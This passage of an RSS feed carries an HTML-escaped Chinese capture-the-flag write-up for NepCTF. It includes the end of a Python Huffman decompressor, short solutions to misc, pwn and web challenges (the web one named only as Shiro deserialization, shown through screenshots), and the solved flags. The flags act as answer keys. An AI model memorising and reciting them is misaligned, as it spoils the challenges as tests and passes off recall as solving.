operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;99&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        build_huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;100&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        reverse_huffman_codes &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;v&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; k &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; k&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; v &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;101&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;102&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        decompressed_data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;bytearray&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;103&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        code &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;104&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;105&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            byte &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;106&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;107&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;break&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;108&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;109&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            byte &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;110&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;111&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; byte &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;112&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    code &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;113&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;114&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    code &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;0&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;115&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;116&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; code &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; reverse_huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;117&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    decompressed_data&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;reverse_huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;code&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;118&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    code &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;119&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;120&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;wb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;121&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;decompressed_data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;122&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;123&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;124&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;__main__&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;125&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# input_file = &#39;input.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;126&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    compressed_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;compressed.bin&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;127&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    decompressed_file &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;decompressed.txt&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;128&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;129&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 压缩文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;130&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# compress(input_file, compressed_file)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;131&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;132&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# 解压缩文件&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;133&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    decompress&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;compressed_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; decompressed_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/wp/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;3connectedfive&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3connectedfive&#34;&gt;#&lt;/a&gt; 3.ConnectedFive&lt;/h4&gt;
&lt;p&gt;五子连珠，到 42 即可拿 flag&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;4checkin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4checkin&#34;&gt;#&lt;/a&gt; 4.CheckIn&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;NepCTF H4ve_Fun_1N_This_Game}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;5陌生的语言&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5陌生的语言&#34;&gt;#&lt;/a&gt; 5. 陌生的语言&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/1.jpg&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/1691849788716.jpg&#34; alt=&#34;1691849788716&#34;&gt;&lt;/p&gt;
&lt;p&gt;对照码表：NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&lt;/p&gt;
&lt;p&gt;NepCTF NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}&lt;/p&gt;
&lt;h4 id=&#34;6小叮弹钢琴&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6小叮弹钢琴&#34;&gt;#&lt;/a&gt; 6. 小叮弹钢琴&lt;/h4&gt;
&lt;p&gt;音频有信息&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;-.–/—/…-/…/…/—/…-/.-…/-…/…-/…/./-/…/…/…/-/—/-…-/—/.-./…/—/–/./-/…/…/-./–.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;摩斯转化&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;YOU SHOULD USE THIS TO XOR SOME THING&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;异或字符串（16 进制转化）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50 0x59 0x7f 0x50 0x11 0x14 0x6e 0x10 0x5d&lt;br&gt;
0x6e 0x45 0x50 0x63 0x74 0x66 0x5b 0x48 0x14 0x50 0x50&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;修改一下：找下规律去修改一下&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0x4e 0x65 0x70 0x43 0x54 0x46 0x7b 0x68 0x34 0x70 0x70 0x79 0x5f 0x70 0x31 0x34 0x4e 0x30 0x7d&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;NepCTF h4ppy_p14N0}&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;7问卷&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7问卷&#34;&gt;#&lt;/a&gt; 7. 问卷&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813202714138.png&#34; alt=&#34;image-20230813202714138&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-pwn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-pwn&#34;&gt;#&lt;/a&gt; 2. pwn:&lt;/h2&gt;
&lt;h4 id=&#34;hrp-chat-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hrp-chat-4&#34;&gt;#&lt;/a&gt; HRP-CHAT-4&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813203342637.png&#34; alt=&#34;image-20230813203342637&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813203738235.png&#34; alt=&#34;image-20230813204233847&#34;&gt;&lt;/p&gt;
&lt;p&gt;一直买直到破坏子线程，然后执行   Safe_Mode_Key&lt;/p&gt;
&lt;p&gt;得到 flag：This is your key!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Nepctf  IAMFOUR_b924541f-bd73-16f1-418d-932d681eb691&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;hrp-chat-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hrp-chat-3&#34;&gt;#&lt;/a&gt; HRP-CHAT-3&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813204233847.png&#34; alt=&#34;image-20230813204233847&#34;&gt;&lt;/p&gt;
&lt;p&gt;把 Boss 能得到 flag，只能去抽奖，但抽不到最高的，但是 H3h3QAQ 够用了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813204151370.png&#34; alt=&#34;image-20230813204151370&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813204502026.png&#34; alt=&#34;image-20230813204502026&#34;&gt;&lt;/p&gt;
&lt;p&gt;序号是 9&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813204547270.png&#34; alt=&#34;image-20230813204547270&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag&lt;/p&gt;
&lt;h2 id=&#34;3-web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-web&#34;&gt;#&lt;/a&gt; 3. web:&lt;/h2&gt;
&lt;h4 id=&#34;ez_java_checkin&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ez_java_checkin&#34;&gt;#&lt;/a&gt; ez_java_checkin&lt;/h4&gt;
&lt;p&gt;shiro 反序列化&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813205114576.png&#34; alt=&#34;image-20230813205114576&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813205917940.png&#34; alt=&#34;image-20230813205917940&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813210003062.png&#34; alt=&#34;image-20230813210003062&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flag。&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
